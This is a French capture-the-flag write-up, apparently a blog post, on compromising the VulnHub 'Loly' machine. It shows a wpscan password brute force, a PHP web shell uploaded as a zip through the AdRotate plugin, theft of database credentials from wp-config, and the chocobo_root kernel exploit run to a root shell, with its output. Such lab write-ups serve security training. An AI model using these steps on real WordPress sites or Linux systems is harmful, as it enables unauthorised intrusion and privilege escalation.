---
title: "Solution du CTF Loly de VulnHub"
tags: [CTF,VulnHub]
---

[Loly](https://vulnhub.com/series/loly,356/) est un CTF de la *SunCSR Team*, il date d'aout 2020.

## WP Security FAIL

Nmap trouve uniquement un serveur web qui héberge un Wordpress :

```
Nmap scan report for 192.168.56.230
Host is up (0.00089s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://www.tenable.com/plugins/nessus/55976
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```

Voici quelques extraits intéressants de la page web :

```html
<!DOCTYPE html><html lang="en-US">
        	<head>

		        <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <link rel="profile" href="//gmpg.org/xfn/11">
        <title>Loly &#8211; Just another WordPress site</title>
<link rel='dns-prefetch' href='//loly.lc' />
--- snip ---
<!-- This site is using AdRotate v5.8.6.2 to display their advertisements - https://ajdg.solutions/ -->
<!-- AdRotate CSS -->
<style type="text/css" media="screen">
	.g { margin:0px; padding:0px; overflow:hidden; line-height:1; zoom:1; }
	.g img { height:auto; }
	.g-col { position:relative; float:left; }
	.g-col:first-child { margin-left: 0; }
	.g-col:last-child { margin-right: 0; }
	@media only screen and (max-width: 480px) {
		.g-col, .g-dyn, .g-single { width:100%; margin-left:0; margin-right:0; }
	}
</style>
<!-- /AdRotate CSS -->
--- snip ---
<script type='text/javascript' src='http://loly.lc/wordpress/wp-content/plugins/adrotate/library/jquery.adrotate.clicktracker.js' id='clicktrack-adrotate-js'></script>
<script type='text/javascript' src='http://loly.lc/wordpress/wp-content/themes/feminine-style/assets/library/slick/slick.min.js?ver=1.1.2' id='slick-js'></script>
--- snip ---
```

Il est mention d'un plugin `AdRotate`. Sur [Exploit Database](https://www.exploit-db.com/search?q=adrotate) on trouve 3 exploits pour des injections SQL, mais les versions ne correspondent pas à celle du site.

De même les scripts PHP touchés par les vulnérabilités ne semblent pas présent sur le CTF (sans doute renommés ou déplacés depuis).

Sur la page de login, je remarque que Wordpress est un peu trop verbeux quant aux erreurs.

Ainsi si je tente une connexion avec le compte admin j'obtiens :

> Unknown username. Check again or try your email address.

Et si j'essaye avec le compte `loly` :

> **Error**: The password you entered for the username **loly** is incorrect.

Wow ! Incroyable de voir encore un comportement comme celui-ci de nos jours. Il s'avère que Wordpress appelle ça les *login hints* : [How to Disable Login Hints in WordPress Login Error Messages](https://www.wpbeginner.com/wp-tutorials/how-to-disable-login-hints-in-wordpress-login-error-messages/)

Moi j'appelle ça une vulnérabilité :D

Du coup je lance directement un brute force du compte `loly` avec `wpscan` :

```bash
docker run -v tools/wordlists/:/wordlists/ --add-host loly.lc:192.168.56.230 -it --rm wpscanteam/wpscan --url http://loly.lc/wordpress/ -U loly -P /wordlists/rockyou.txt
```

Le Wordpress est configuré pour utiliser le nom d'hôte `loly.lc` c'est pour cela que j'ai utilisé l'option `--add-host` de Docker.

```
[!] Valid Combinations Found:
 | Username: loly, Password: fernando
```

## RCE et privesc

Une fois connecté au Wordpress, c'est le drame : l'éditeur de thèmes n'est pas présent.

C'est là que survient le plugin `AdRotate`. En lisant bien la section `media` parmi les pages d'administration du plugin, on trouve ceci :

> **Upload new file**
> 
> **Accepted files:** jpg, jpeg, gif, png, svg, html, js and zip. Maximum size is 512Kb per file. 
> 
> **Important:** Make sure your file has no spaces or special characters in the name. Replace spaces with a - or _.  
> 
> Zip files are automatically extracted in the location where they are uploaded and the original zip file will be deleted once extracted.  
> 
> You can create top-level folders below. Folder names can between 1 and 100 characters long. Any special characters are stripped out.

On ne peut pas uploader un script PHP directement, car l'extension sera bloquée, en revanche on peut uploader un zip contenant un script PHP.

Avec une archive nommée `yolo.zip` je retrouve mon shell à cette adresse :

```
http://loly.lc/wordpress/wp-content/banners/yolo/cmd.php?cmd=id
```

Je commence par récupérer les identifiants présents dans la configuration de Wordpress :

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
```

Le mot de passe est valide pour l'utilisatrice `loly`. Malheureusement elle ne semble pas avoir de permissions particulières sur le système.

J'ai surveillé les processus à l'aide de `pspy` mais il semble qu'aucune tache planifiée n'ait été mise en place.

Je me concentre donc sur les exploits suggérés par `LinPEAS` :

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

`Sudo Baron Samedit 2` n'avait pas l'air de fonctionner ici, mais l'exploit kernel `chocobo` fonctionne :

```console
loly@ubuntu:/tmp$ gcc -o chocobo chocobo.c -lpthread
loly@ubuntu:/tmp$ ./chocobo 
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-31-generic #50
proc_dostring = 0xffffffff81087ea0
modprobe_path = 0xffffffff81e48f80
register_sysctl_table = 0xffffffff81286e90
set_memory_rw = 0xffffffff8106f370
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f370, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 535869, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 65584
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying................................
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff81286e90, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 71951, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 0
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e90, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 72497, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e90, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 124189, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
root@ubuntu:/tmp# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
  ____               ____ ____  ____  
 / ___| _   _ _ __  / ___/ ___||  _ \ 
 \___ \| | | | '_ \| |   \___ \| |_) |
  ___) | |_| | | | | |___ ___) |  _ < 
 |____/ \__,_|_| |_|\____|____/|_| \_\
                                      
Congratulations. I'm BigCityBoy
```
